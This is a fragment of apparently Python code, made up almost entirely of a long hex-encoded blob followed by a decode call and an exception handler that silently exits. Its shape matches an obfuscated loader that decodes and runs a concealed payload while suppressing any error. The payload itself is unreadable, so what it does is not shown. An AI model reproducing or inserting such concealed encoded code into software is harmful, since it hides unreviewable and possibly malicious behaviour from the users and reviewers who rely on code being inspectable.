53efef78f47d91f36e3a54b79c32cce6f8e633b4df3bdd152b2215c0e443ba8d47eb0c7d0880da3bbc936432fdbed7989eb77e5cca5d03d4b955ac562cfc396bb7f6cf695e7d566ffaf579fbefdf6f9ddabcffffef26373ffcfed76f37fb7afbefcfeeaaf6f3f5e7dfaf8f5ebc75fbf7edefcf1f9c7c71f3fbeef34fefaaf2f5f7f7cf9ebef5d4978f5d3a76f7ffef3cbd7cf3fbd7ef59fdffeda6d7df5edfbab68e99bfdc2dd9661f8f3db6ffffafa791876bb7efa69fbeaffbc7ff5d361e54f9680bf3efe39dd7e80f1eaf3d7bf3fefa16c76e938f2c9669f9d2021870d9d0d56ecbcf9217c8273f74b46d4bd98877fe5b675447010b5ffed6ecb5d5172d4bb479843cdd0c5f4086da3b0cd87bb16613804f75e9c9f19f8142928b876966dff3f83658c16'.replace("\n" , ""))).decode())

except Exception as e:
    exit()
